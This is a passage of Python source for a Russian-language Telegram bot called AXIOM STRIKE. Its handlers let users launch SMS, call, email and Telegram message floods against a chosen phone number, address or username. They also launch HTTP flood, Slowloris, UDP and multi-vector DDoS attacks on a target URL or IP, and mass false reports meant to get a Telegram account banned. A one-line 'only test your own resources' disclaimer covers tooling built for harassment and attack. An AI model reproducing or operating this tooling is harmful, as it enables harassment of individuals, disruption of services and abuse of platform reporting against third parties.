            "🔥 **AXIOM STRIKE BOT** 🔥\n\n"
            "Мощный инструмент для стресс-тестирования.\n\n"
            "📱 **Бомбер:** СМС | Звонки | Email | Telegram\n"
            "💣 **DDoS:** HTTP | Slowloris | UDP | Multi-Vector\n"
            "💀 **Снос аккаунтов:** Массовые жалобы + Спам-флуд\n\n"
            "⚠️ Только для тестирования своих ресурсов!\n\n"
            "Подпишись на канал: @AXIOM_SOFT",
            reply_markup=InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text="✅ ПОДПИСАЛСЯ", callback_data="subscribed")]
                ]
            )
        )

    async def cmd_help(self, message: types.Message):
        await message.answer(
            "📚 **Помощь по AXIOM STRIKE**\n\n"
            "📱 **БОМБЕР** - массовая отправка сообщений\n"
            "💣 **DDOS** - стресс-тестирование сайтов\n"
            "💀 **СНОС АККАУНТА** - блокировка Telegram аккаунтов\n"
            "📊 **СТАТИСТИКА** - просмотр данных\n"
            "⚙️ **НАСТРОЙКИ** - конфигурация",
            reply_markup=self.main_keyboard()
        )

    async def handle_subscribe(self, callback: types.CallbackQuery):
        await callback.answer()
        await callback.message.edit_text(
            "✅ Подписка подтверждена!\n\n"
            "🔥 Добро пожаловать в AXIOM STRIKE"
        )
        await callback.message.answer("Выберите действие:", reply_markup=self.main_keyboard())

    async def handle_main_menu(self, message: types.Message, state: FSMContext):
        if message.text == "📱 БОМБЕР":
            await message.answer("📱 **МЕНЮ БОМБЕРА**\nВыберите тип атаки:", reply_markup=self.bomber_keyboard())
        elif message.text == "💣 DDOS АТАКА":
            await message.answer("💣 **МЕНЮ DDOS**\nВыберите метод атаки:", reply_markup=self.ddos_keyboard())
        elif message.text == "💀 СНОС АККАУНТА":
            await self.handle_destroy_account(message, state)
        elif message.text == "📊 СТАТИСТИКА":
            await self.handle_stats(message)
        elif message.text == "⚙️ НАСТРОЙКИ":
            await self.handle_settings(message)

    async def handle_back(self, message: types.Message):
        await message.answer("Главное меню:", reply_markup=self.main_keyboard())

    # ========== МЕНЮ БОМБЕРА ==========
    async def handle_bomber_menu(self, message: types.Message, state: FSMContext):
        if message.text == "🔙 НАЗАД":
            await message.answer("Главное меню:", reply_markup=self.main_keyboard())
            return
        if message.text == "💬 СМС БОМБЕР":
            await self.handle_sms_bomber(message, state)
        elif message.text == "📞 ЗВОНКИ (ФЛУД)":
            await self.handle_call_bomber(message, state)
        elif message.text == "📧 EMAIL БОМБЕР":
            await self.handle_email_bomber(message, state)
        elif message.text == "📩 TELEGRAM БОМБЕР":
            await self.handle_telegram_bomber(message, state)

    async def handle_ddos_menu(self, message: types.Message, state: FSMContext):
        if message.text == "🔙 НАЗАД":
            await message.answer("Главное меню:", reply_markup=self.main_keyboard())
            return
        if message.text == "🌐 HTTP FLOOD":
            await self.handle_http_flood(message, state)
        elif message.text == "🐌 SLOWLORIS":
            await self.handle_slowloris(message, state)
        elif message.text == "📡 UDP FLOOD":
            await self.handle_udp_flood(message, state)
        elif message.text == "💀 MULTI-VECTOR":
            await self.handle_multi_vector(message, state)

    # ========== СНОС АККАУНТА ==========
    async def handle_destroy_account(self, message: types.Message, state: FSMContext):
        await state.set_state(BomberStates.waiting_for_destroy_username)
        await message.answer(
            "💀 **СНОС TELEGRAM АККАУНТА**\n\n"
            "Введите @username для сноса:\n"
            "📝 Пример: @username123\n\n"
            "⚠️ 50-100 жалоб гарантируют блокировку!"
        )

    async def process_destroy_username(self, message: types.Message, state: FSMContext):
        username = message.text.strip()
        if not username.startswith('@'):
            username = '@' + username
        await state.update_data(username=username)
        await state.set_state(BomberStates.waiting_for_destroy_method)
        await message.answer(
            "📊 **Выберите метод сноса:**\n\n"
            "1️⃣ **📝 Массовые жалобы** (50-100 жалоб)\n"
            "2️⃣ **💬 Спам флуд** (50 сообщений)\n"
            "3️⃣ **💀 Все методы** (жалобы + спам)\n\n"
            "Введите номер метода (1, 2 или 3):"
        )

    async def process_destroy_method(self, message: types.Message, state: FSMContext):
        method = message.text.strip()
        if method not in ['1', '2', '3']:
            await message.answer("❌ Введите 1, 2 или 3!")
            return

        method_map = {'1': 'reports', '2': 'spam', '3': 'all'}
        await state.update_data(method=method_map[method])
        await state.set_state(BomberStates.waiting_for_destroy_count)
        await message.answer("🔢 Введите количество (рекомендуется 50-100):")

    async def process_destroy_count(self, message: types.Message, state: FSMContext):
        try:
            count = int(message.text.strip())
            if count < 10 or count > 200:
                await message.answer("❌ Введите число от 10 до 200!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        username = data.get('username')
        method = data.get('method')
        await state.clear()

        status_msg = await message.answer(
            f"💀 **Запуск сноса аккаунта {username}**\n"
            f"📊 Метод: {method}\n"
            f"⏳ Начинаем..."
        )

        async def update_progress(current, total):
            if current % 5 == 0 or current == total:
                await status_msg.edit_text(
                    f"💀 **Снос аккаунта {username}**\n"
                    f"📊 Прогресс: {current}/{total}\n"
                    f"⏳ Идёт процесс..."
                )

        if method == 'reports':
            results = await self.destroyer.mass_report(username, count, update_progress)
        elif method == 'spam':
            results = await self.destroyer.spam_flood(username, count, update_progress)
        else:
            results = await self.destroyer.destroy_account(username, count, update_progress)

        success = sum(1 for r in results if r['status'] == 'sent')

        await status_msg.edit_text(
            f"💀 **Снос аккаунта {username} завершён!**\n\n"
            f"📊 Отправлено: {len(results)}\n"
            f"✅ Успешно: {success}\n"
            f"❌ Ошибок: {len(results) - success}\n"
            f"⏱ Время: {datetime.now().strftime('%H:%M:%S')}\n\n"
            f"🔥 Аккаунт будет заблокирован в ближайшее время!",
            reply_markup=self.main_keyboard()
        )

    # ========== ОБРАБОТЧИКИ БОМБЕРА ==========
    async def handle_sms_bomber(self, message: types.Message, state: FSMContext):
        await state.set_state(BomberStates.waiting_for_phone)
        await message.answer(
            "📱 **СМС БОМБЕР**\n\n"
            "Введите номер телефона:\n"
            "📝 Пример: +79001234567"
        )

    async def process_sms_phone(self, message: types.Message, state: FSMContext):
        phone = message.text.strip()
        if not re.match(r'^\+?[0-9]{10,15}$', phone):
            await message.answer("❌ Введите корректный номер!")
            return
        await state.update_data(phone=phone)
        await state.set_state(BomberStates.waiting_for_sms_count)
        await message.answer(
            "📊 Введите количество сообщений (1-100):"
        )

    async def process_sms_count(self, message: types.Message, state: FSMContext):
        try:
            count = int(message.text.strip())
            if count < 1 or count > 100:
                await message.answer("❌ Введите число от 1 до 100!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        phone = data.get('phone')
        await state.clear()

        status_msg = await message.answer(f"⏳ Запуск СМС бомбера...\n0/{count}")

        async def update_progress(progress, current, total):
            if current % 10 == 0 or current == total:
                await status_msg.edit_text(f"⏳ Отправка СМС...\n{current}/{total} ({int(progress)}%)")

        results = await self.sms_bomber.send_sms(phone, count, update_progress)

        success = sum(1 for r in results if r['status'] == 'success')
        errors = len(results) - success

        await status_msg.edit_text(
            f"✅ **СМС бомбер завершён!**\n\n"
            f"📱 Номер: {phone}\n"
            f"📊 Отправлено: {success}\n"
            f"❌ Ошибок: {errors}\n"
            f"📈 Всего попыток: {len(results)}\n"
            f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}",
            reply_markup=self.bomber_keyboard()
        )

    async def handle_call_bomber(self, message: types.Message, state: FSMContext):
        await state.set_state(BomberStates.waiting_for_phone)
        await message.answer(
            "📞 **ЗВОНКИ (ФЛУД)**\n\n"
            "Введите номер телефона:\n"
            "📝 Пример: +79001234567"
        )

    async def process_call_count(self, message: types.Message, state: FSMContext):
        try:
            count = int(message.text.strip())
            if count < 1 or count > 20:
                await message.answer("❌ Введите число от 1 до 20!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        phone = data.get('phone')
        await state.clear()

        status_msg = await message.answer(f"⏳ Запуск звонков...\n0/{count}")

        async def update_progress(current, total):
            await status_msg.edit_text(f"⏳ Совершение звонков...\n{current}/{total}")

        results = await self.call_bomber.make_calls(phone, count, update_progress)

        success = sum(1 for r in results if r['status'] == 'success')

        await status_msg.edit_text(
            f"✅ **Звонки завершены!**\n\n"
            f"📞 Номер: {phone}\n"
            f"📊 Совершено: {success}\n"
            f"❌ Ошибок: {len(results) - success}\n"
            f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}",
            reply_markup=self.bomber_keyboard()
        )

    async def handle_email_bomber(self, message: types.Message, state: FSMContext):
        await state.set_state(BomberStates.waiting_for_email)
        await message.answer(
            "📧 **EMAIL БОМБЕР**\n\n"
            "Введите email адрес:\n"
            "📝 Пример: example@gmail.com"
        )

    async def process_email(self, message: types.Message, state: FSMContext):
        email = message.text.strip()
        if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
            await message.answer("❌ Введите корректный email!")
            return
        await state.update_data(email=email)
        await state.set_state(BomberStates.waiting_for_email_count)
        await message.answer("📊 Введите количество писем (1-50):")

    async def process_email_count(self, message: types.Message, state: FSMContext):
        try:
            count = int(message.text.strip())
            if count < 1 or count > 50:
                await message.answer("❌ Введите число от 1 до 50!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        email = data.get('email')
        await state.clear()

        status_msg = await message.answer(f"⏳ Запуск Email бомбера...\n0/{count}")

        async def update_progress(current, total):
            await status_msg.edit_text(f"⏳ Отправка писем...\n{current}/{total}")

        results = await self.email_bomber.send_emails(email, count, update_progress)

        success = sum(1 for r in results if r['status'] == 'sent')

        await status_msg.edit_text(
            f"✅ **Email бомбер завершён!**\n\n"
            f"📧 Email: {email}\n"
            f"📊 Отправлено: {success}\n"
            f"❌ Ошибок: {len(results) - success}\n"
            f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}",
            reply_markup=self.bomber_keyboard()
        )

    async def handle_telegram_bomber(self, message: types.Message, state: FSMContext):
        await state.set_state(BomberStates.waiting_for_telegram)
        await message.answer(
            "📩 **TELEGRAM БОМБЕР**\n\n"
            "Введите @username:\n"
            "📝 Пример: @username123"
        )

    async def process_telegram(self, message: types.Message, state: FSMContext):
        username = message.text.strip()
        if not username.startswith('@'):
            username = '@' + username
        await state.update_data(username=username)
        await state.set_state(BomberStates.waiting_for_telegram_count)
        await message.answer("📊 Введите количество сообщений (1-30):")

    async def process_telegram_count(self, message: types.Message, state: FSMContext):
        try:
            count = int(message.text.strip())
            if count < 1 or count > 30:
                await message.answer("❌ Введите число от 1 до 30!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        username = data.get('username')
        await state.clear()

        status_msg = await message.answer(f"⏳ Запуск Telegram бомбера...\n0/{count}")

        async def update_progress(current, total):
            await status_msg.edit_text(f"⏳ Отправка сообщений...\n{current}/{total}")

        results = await self.tg_bomber.send_messages(username, count, update_progress)

        success = sum(1 for r in results if r['status'] == 'sent')

        await status_msg.edit_text(
            f"✅ **Telegram бомбер завершён!**\n\n"
            f"📩 Пользователь: {username}\n"
            f"📊 Отправлено: {success}\n"
            f"❌ Ошибок: {len(results) - success}\n"
            f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}",
            reply_markup=self.bomber_keyboard()
        )

    # ========== ОБРАБОТЧИКИ DDOS ==========
    async def handle_http_flood(self, message: types.Message, state: FSMContext):
        await state.set_state(DDoSStates.waiting_for_url)
        await message.answer(
            "🌐 **HTTP FLOOD**\n\n"
            "Введите URL цели:\n"
            "📝 Пример: https://example.com"
        )

    async def process_ddos_url(self, message: types.Message, state: FSMContext):
        url = message.text.strip()
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        await state.update_data(url=url)
        await state.set_state(DDoSStates.waiting_for_threads)
        await message.answer(
            "⚡ Введите количество потоков (100-5000):"
        )

    async def process_ddos_threads(self, message: types.Message, state: FSMContext):
        try:
            threads = int(message.text.strip())
            if threads < 100 or threads > 5000:
                await message.answer("❌ Введите число от 100 до 5000!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        await state.update_data(threads=threads)
        await state.set_state(DDoSStates.waiting_for_duration)
        await message.answer(
            "⏱ Введите длительность в секундах (30-300):"
        )

    async def process_ddos_duration(self, message: types.Message, state: FSMContext):
        try:
            duration = int(message.text.strip())
            if duration < 30 or duration > 300:
                await message.answer("❌ Введите число от 30 до 300!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        url = data.get('url')
        threads = data.get('threads', 500)
        await state.clear()

        status_msg = await message.answer(
            f"💣 **HTTP FLOOD запущена!**\n"
            f"🌐 URL: {url}\n"
            f"⚡ Потоков: {threads}\n"
            f"⏱ Длительность: {duration}с\n"
            f"⏳ Идёт атака..."
        )

        stats = await self.ddos_engine.http_flood(url, threads, duration, None)

        await status_msg.edit_text(
            f"💣 **HTTP FLOOD завершена!**\n\n"
            f"🌐 URL: {url}\n"
            f"📊 Запросов: {stats['requests']}\n"
            f"✅ Успешно: {stats['success']}\n"
            f"❌ Ошибок: {stats['errors']}\n"
            f"📈 RPS: {stats['requests'] / duration:.1f}\n"
            f"⏱ Длительность: {duration}с",
            reply_markup=self.ddos_keyboard()
        )

    async def handle_slowloris(self, message: types.Message, state: FSMContext):
        await state.set_state(DDoSStates.waiting_for_url)
        await message.answer(
            "🐌 **SLOWLORIS**\n\n"
            "Введите URL цели:\n"
            "📝 Пример: https://example.com"
        )

    async def process_ddos_ddos_duration(self, message: types.Message, state: FSMContext):
        try:
            duration = int(message.text.strip())
            if duration < 60 or duration > 600:
                await message.answer("❌ Введите число от 60 до 600!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        url = data.get('url')
        method = data.get('method', 'slowloris')
        ip = data.get('ip')
        port = data.get('port')
        await state.clear()

        status_msg = await message.answer(
            f"💀 **{method.upper()} запущена!**\n"
            f"⏳ Идёт атака..."
        )

        if method == 'slowloris':
            stats = await self.ddos_engine.slowloris(url, duration, None)
            result_text = (
                f"🐌 **SLOWLORIS завершена!**\n\n"
                f"🌐 URL: {url}\n"
                f"📊 Соединений: {stats['connections']}\n"
                f"🔄 Активных: {stats['active']}\n"
                f"⏱ Длительность: {duration}с"
            )
        elif method == 'udp':
            stats = await self.ddos_engine.udp_flood(ip, port, duration, None)
            result_text = (
                f"📡 **UDP FLOOD завершена!**\n\n"
                f"🌐 IP: {ip}:{port}\n"
                f"📦 Пакетов: {stats['packets']}\n"
                f"💾 Байт: {stats['bytes']}\n"
                f"⏱ Длительность: {duration}с"
            )
        elif method == 'multi':
            stats = await self.ddos_engine.multi_vector(url, duration, None)
            result_text = (
                f"💀 **MULTI-VECTOR завершена!**\n\n"
                f"🌐 URL: {url}\n"
                f"📊 HTTP запросов: {stats['http']['requests']}\n"
                f"🌐 HTTP успешно: {stats['http']['success']}\n"
                f"🐌 Slowloris соединений: {stats['slowloris']['connections']}\n"
                f"📦 UDP пакетов: {stats['udp']['packets']}\n"
                f"💾 UDP байт: {stats['udp']['bytes']}\n"
                f"⏱ Длительность: {duration}с"
            )
        else:
            result_text = "❌ Неизвестный метод"

        await status_msg.edit_text(result_text, reply_markup=self.ddos_keyboard())

    async def handle_udp_flood(self, message: types.Message, state: FSMContext):
        await state.set_state(DDoSStates.waiting_for_ip)
        await message.answer(
            "📡 **UDP FLOOD**\n\n"
            "Введите IP:PORT цели:\n"
            "📝 Пример: 192.168.1.1:80"
        )

    async def process_ddos_ip(self, message: types.Message, state: FSMContext):
        try:
            ip, port = message.text.strip().split(':')
            port = int(port)
        except:
            await message.answer("❌ Введите в формате IP:PORT!")
            return

        await state.update_data(ip=ip, port=port, method='udp')
        await state.set_state(DDoSStates.waiting_for_ddos_duration)
        await message.answer("⏱ Введите длительность (30-120 сек):")

    async def handle_multi_vector(self, message: types.Message, state: FSMContext):
        await state.set_state(DDoSStates.waiting_for_url)
        await state.update_data(method='multi')
        await message.answer(
            "💀 **MULTI-VECTOR**\n\n"
            "Введите URL цели:\n"
            "📝 Пример: https://example.com"
        )

    # ========== СТАТИСТИКА И НАСТРОЙКИ ==========
    async def handle_stats(self, message: types.Message):
        await message.answer(
            "📊 **СТАТИСТИКА AXIOM STRIKE**\n\n"
            f"📅 Дата: {datetime.now().strftime('%d.%m.%Y %H:%M')}\n"
            f"📱 Бомбер: активен\n"
            f"💣 DDoS: активен\n"
            f"💀 Снос: активен\n"
            f"⚡ Статус: ONLINE\n"
            f"🔥 Версия: 4.0.0",
            reply_markup=self.main_keyboard()
        )

    async def handle_settings(self, message: types.Message):
        await message.answer(
            "⚙️ **НАСТРОЙКИ**\n\n"
            "🔹 Язык: Русский\n"
            "🔹 Режим: Боевой\n"
            "🔹 Уведомления: Включены\n"
            "🔹 Логирование: Включено\n\n"
            "📌 Для изменения настроек обратитесь к администратору.",
            reply_markup=self.main_keyboard()
        )

    # ========== ЗАПУСК БОТА ==========
    async def start(self):
        logger.info("🔥 Запуск AXIOM STRIKE BOT...")
        try:
            await self.bot.get_me()
            logger.info("✅ Подключение успешно!")
            await self.dp.start_polling(self.bot)
        except Exception as e:
            logger.error(f"❌ Ошибка: {e}")
            raise


# ===================== ЗАПУСК =====================
if __name__ == "__main__":
    import re
    if API_TOKEN == "ВСТАВИТЬ_ТОКЕН_СЮДА":
        print("❌ Ошибка: Не установлен токен бота!")
        exit(1)

    try:
        bot = AxiomStrikeBot(token=API_TOKEN)
        asyncio.run(bot.start())
    except KeyboardInterrupt:
        print("\n⏹️ Бот остановлен")
    except Exception as e:
        print(f"❌ Ошибка: {e}")
        logger.error(f"Критическая ошибка: {e}", exc_info=True)
